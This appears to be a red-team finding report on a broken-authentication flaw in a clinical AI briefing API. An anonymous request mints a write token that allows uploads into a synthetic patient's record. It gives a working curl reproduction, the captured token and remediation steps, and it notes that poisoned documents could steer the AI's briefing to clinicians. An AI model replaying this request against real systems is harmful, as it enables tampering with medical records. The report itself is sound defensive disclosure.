# F-24b44c5180 — broken-authentication via /v1/source-document-context

- **ID:** F-24b44c5180
- **Severity (provisional):** critical — confirm with CVSS v4
- **Category:** broken-authentication
- **Taxonomy:** OWASP API Security Top 10 2023: API2 Broken Authentication
- **Component:** `https://dtstest.64.177.10.182.nip.io/agentforge-w2/v1/source-document-context`

## Description
`/v1/source-document-context` issues a signed **write** token (`write-source-document`) to any caller, with no authentication. That token is what the document-upload route (`/v1/source-documents`) accepts, so an anonymous caller obtains upload capability for a patient's record (limited by the target's per-patient upload allow-list).

**Clinical impact:** Anyone can upload source documents into a patient's record: an integrity breach. A poisoned document then feeds the clinician's AI briefing, so it can shape what the clinician reads about that patient.

_The target serves synthetic fixture patients only; no real PHI was accessed. The impact statement describes the same defect in a real deployment._

## Reproduction
Record the build under test first: `curl -s "https://dtstest.64.177.10.182.nip.io/agentforge-w2/health"` → note `git_sha`.

Minimal attack sequence (no credentials, no cookies, no headers):

```bash
curl -s "https://dtstest.64.177.10.182.nip.io/agentforge-w2/v1/source-document-context?patient_uuid=fixture-patient-001"
```

**Validate (deterministic):** fixed when the request above returns `401`/`403` (or `404` with the synthetic mint disabled) and the body contains no `demo_token`. Vulnerable when it returns `200` with a `demo_token`, as observed.

Platform replay: re-runs every frozen regression case (this finding's case is `reg-503e9c6ca6`) with the same probe and oracle against the live target; exit code 0 only if all held. Needs this repo's `.env` (see README).

```bash
uv run redteam regression --target agentforge-w2 --sha <git_sha from /health>
```

## Observed vs expected
- **Observed:** an anonymous `GET /v1/source-document-context` returned HTTP 200 with a signed `demo_token` (scope `write-source-document`, patient `fixture-patient-001`, valid 300 s). `unauthorized_access`: returned protected data or issued a credential on a request that should have been rejected
- **Expected:** minting a session token requires authentication; an anonymous request is rejected.

## Evidence (what actually happened)
**Oracle(s) that fired:** `unauthorized_access` — returned protected data or issued a credential on a request that should have been rejected

- `GET /v1/source-document-context` → **HTTP 200** (134ms)
  - request (fields starting `_` are harness annotations, not sent): `{"patient_uuid": "fixture-patient-001", "_auth": "none (anonymous)"}`
  - response: `{"demo_token":"eyJwYXRpZW50X3V1aWQiOiJmaXh0dXJlLXBhdGllbnQtMDAxIiwiY2xpbmljaWFuX3V1aWQiOiJmaXh0dXJlLXBoeXNpY2lhbi0wMDEiLCJzY29wZSI6IndyaXRlLXNvdXJjZS1kb2N1bWVudCIsImlzc3VlciI6InN5bnRoZXRpYy1kZW1vIiwiYXV0aG4iOiJzeW50aGV0aWMiLCJyb2xlIjoiY2xpbmljaWFuIiwiYWNsIjoid3JpdGUiLCJleHBpcmVzX2F0IjoxNzkwNjg5MzMwfQ.DhomeFY2rFLwP-uAj7h9PMAHwvFa0AR13moCMOy5hrk","patient_uuid":"fixture-patient-001","clinician_uuid":"fixture-physician-001","expires_in_seconds":300,"synthetic_only":true,"scope":"write-source-document"}`
  - decoded token payload (unsigned view): `{"patient_uuid": "fixture-patient-001", "clinician_uuid": "fixture-physician-001", "scope": "write-source-document", "issuer": "synthetic-demo", "authn": "synthetic", "role": "clinician", "acl": "write", "expires_at": 1790689330}`

## Recommended remediation
1. Disable `AGENTFORGE_SYNTHETIC_CONTEXT` in every deployment that is not an explicit demo; with it off, the route must return 404/403 and issue no token.
2. Where a demo mint must stay on, require an authenticated caller (evaluator access code or session) and bind issuance to that caller's identity: mint only for patients the caller may access, and log caller → patient → scope for every token issued.
3. Rate-limit the mint per client (return `429` with `Retry-After`).
4. Keep the existing short token TTL (300 s) and the token↔patient binding; do not lengthen the TTL to compensate.
5. Add a target-side test that fails if an anonymous request to the mint returns a token.

## Status
- **Finding status:** `risk-accepted`
- **Report R-24b44c5180:** `pending_approval` (held for human approval: critical/high or unevidenced)
- **Observed on builds:** `live-2026-09-29` (2026-09-29), `refactor-smoke` (2026-09-29), `refactor23-smoke` (2026-09-29), `bfbb1eb20716a032918067937154f8d6b5001b87` (2026-09-29), `da7451d1c9bb2c32bd0625840d28103fa13d4529` (2026-09-29), `d5e79bb37c48fccb1322c7c8b8bcae2626e076cb` (2026-10-01), `926805ce3ce61233f18857d6f71c739177b138e9` (2026-10-01) (non-hex values are run labels recorded before `/health` git SHAs were passed, not target commits)

**Fix validation:**
No harness replay on a fixed build is recorded in this store yet. See `docs/findings/README.md` for the current fix disposition (a fix may be deployed, risk-accepted, or pending); validate with the commands above on the fixed build's `/health` `git_sha`.

## References
- Verdicts: ver-f7e389268992, ver-314f35240902, ver-6eb0962caf2d, ver-ab7d4c3bc062, ver-712b3c4e5436, ver-8fca41d2c111, ver-5de0070fbb0c, ver-4cc244d21fe9, ver-7c72e92aab1d, ver-6ab094da3c9a, ver-a002fb7f8689, ver-c3aa53eb3f74, ver-017708fd343d, ver-f3ef2fe97f0b (platform store; `uv run redteam evidence <attempt_id>` dumps the raw exchange, first attempt `att-616b3844d07b`)
